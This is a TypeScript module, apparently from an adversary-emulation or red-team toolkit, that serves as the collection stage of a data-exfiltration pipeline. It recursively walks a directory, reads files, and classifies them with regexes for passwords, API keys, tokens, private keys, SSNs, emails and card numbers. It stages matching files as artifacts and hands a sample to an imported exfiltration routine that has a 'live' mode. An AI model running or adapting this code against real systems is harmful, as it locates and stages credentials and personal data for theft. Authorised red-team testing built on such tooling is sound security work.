/**
 * @module collection_engine
 * Structured data classification, staging, and collection for exfil pipelines.
 */
import * as fs from "node:fs"
import * as path from "node:path"
import { runStagedExfilTest } from "./exfil.ts"

export type DataClassification = "pii" | "credential" | "financial" | "ip" | "operational" | "unknown"

export interface CollectedArtifact {
  path: string
  classification: DataClassification
  sizeBytes: number
  sha256: string
  staged: boolean
}

export interface CollectionStageResult {
  artifacts: CollectedArtifact[]
  totalBytes: number
  classifications: Record<DataClassification, number>
  exfilTest: Awaited<ReturnType<typeof runStagedExfilTest>>
  summary: string
}

const CLASSIFY_PATTERNS: Array<{ type: DataClassification; pattern: RegExp }> = [
  { type: "credential", pattern: /password|api[_-]?key|secret|token|BEGIN (RSA|OPENSSH)/i },
  { type: "pii", pattern: /ssn|social.security|\b\d{3}-\d{2}-\d{4}\b|email.*@/i },
  { type: "financial", pattern: /invoice|payment|credit.card|\b\d{4}[- ]?\d{4}[- ]?\d{4}/i },
  { type: "ip", pattern: /confidential|proprietary|internal.only/i },
]

function classifyContent(content: string): DataClassification {
  for (const { type, pattern } of CLASSIFY_PATTERNS) {
    if (pattern.test(content)) return type
  }
  return "unknown"
}

function simpleHash(content: string): string {
  let h = 0
  for (let i = 0; i < content.length; i++) h = ((h << 5) - h + content.charCodeAt(i)) | 0
  return Math.abs(h).toString(16)
}

export async function stageCollection(
  scanDir: string,
  opts: { live?: boolean; maxFiles?: number } = {},
): Promise<CollectionStageResult> {
  const artifacts: CollectedArtifact[] = []
  const max = opts.maxFiles ?? 100
  const classifications: Record<DataClassification, number> = {
    pii: 0, credential: 0, financial: 0, ip: 0, operational: 0, unknown: 0,
  }

  if (fs.existsSync(scanDir)) {
    const walk = (dir: string, depth = 0) => {
      if (depth > 4 || artifacts.length >= max) return
      for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
        if (artifacts.length >= max) break
        const fp = path.join(dir, entry.name)
        if (entry.isDirectory()) walk(fp, depth + 1)
        else if (entry.isFile() && entry.size < 512_000) {
          try {
            const content = fs.readFileSync(fp, "utf8")
            const cls = classifyContent(content)
            classifications[cls]++
            artifacts.push({
              path: fp,
              classification: cls,
              sizeBytes: content.length,
              sha256: simpleHash(content),
              staged: true,
            })
          } catch { /* binary skip */ }
        }
      }
    }
    walk(scanDir)
  }

  const sample = artifacts.filter((a) => a.classification !== "unknown").slice(0, 3)
    .map((a) => `${a.classification}:${path.basename(a.path)}`).join("; ")
  const exfilTest = await runStagedExfilTest(sample || "operational-data-sample", { live: opts.live ?? false })

  const totalBytes = artifacts.reduce((s, a) => s + a.sizeBytes, 0)
  return {
    artifacts,
    totalBytes,
    classifications,
    exfilTest,
    summary: `Collected ${artifacts.length} artifacts (${totalBytes} bytes) — ${Object.entries(classifications).filter(([, v]) => v > 0).map(([k, v]) => `${k}:${v}`).join(", ")}`,
  }
}

export default { stageCollection, classifyContent }
